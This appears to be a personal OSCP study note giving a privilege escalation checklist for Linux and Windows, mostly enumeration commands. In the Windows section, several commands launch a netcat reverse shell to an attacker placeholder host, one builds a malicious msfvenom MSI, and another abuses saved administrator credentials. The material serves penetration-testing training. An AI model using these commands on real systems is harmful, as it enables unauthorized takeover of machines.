Created: 2026-07-24 13:50
#note

# 🔑 Privilege Escalation Quick Reference Guide

> [!tip] Golden Rule
> Always run automated scripts (`linpeas.sh` / `winPEAS.exe` / `PrivescCheck.ps1`) first, then manually verify suspicious findings using GTFOBins or LOLBAS.

---

## 🐧 Linux Privilege Escalation Checklist

1. **Sudo Privileges (`sudo -l`):**
   - Check binaries against [GTFOBins](https://gtfobins.github.io/).
   - Check environment variables: `env_keep+=LD_PRELOAD` or `env_keep+=PYTHONPATH`.

2. **SUID / SGID Binaries:**
   ```bash
   find / -perm -u=s -type f 2>/dev/null
   ```

3. **Cron Jobs & System Timers:**
   ```bash
   cat /etc/crontab /etc/cron.*/*
   pspy64 # Monitor real-time processes without root
   ```

4. **Capabilities:**
   ```bash
   getcap -r / 2>/dev/null
   ```

5. **Writable Configuration Files:**
   - `/etc/passwd` (writable -> add root user hash).
   - `/etc/exports` (NFS `no_root_squash`).

---

## 🪟 Windows Privilege Escalation Checklist

1. **Token Impersonation (SeImpersonatePrivilege / SeAssignPrimaryToken):**
   - Use `PrintSpoofer.exe`, `GodPotato.exe`, or `JuicyPotatoNG.exe`.

2. **Unquoted Service Paths:**
   ```cmd
   wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """"
   ```

3. **Insecure Service Permissions:**
   ```cmd
   accesschk.exe /accepteula -uwcqv "Authenticated Users" *
   sc config <SERVICE_NAME> binpath= "C:\temp\nc.exe -e cmd.exe <KALI_IP> 4444"
   sc start <SERVICE_NAME>
   ```

4. **AlwaysInstallElevated:**
   ```cmd
   reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
   reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
   ```
   - If both equal `1`, generate malicious `.msi` via `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f msi -o reverse.msi` and run `msiexec /quiet /qn /i reverse.msi`.

5. **Saved Credentials in Registry / Files:**
   ```cmd
   cmdkey /list
   runas /savecred /user:administrator "C:\temp\nc.exe -e cmd.exe <KALI_IP> 4444"
   ```

---

## 🔗 Useful External Links
- [Tib3rius Linux PrivEsc Cheatsheet](https://github.com/tib3rius/linux-privesc-notes)
- [Tib3rius Windows PrivEsc Cheatsheet](https://github.com/tib3rius/windows-privesc-notes)
- [PEASS-ng Repository](https://github.com/peass-ng/PEASS-ng)
- [GTFOBins](https://gtfobins.github.io/)
- [LOLBAS Project](https://lolbas-project.github.io/)

#### Tags
#oscp #privesc #linux #windows #gtfobins #lolbas #linpeas #winpeas
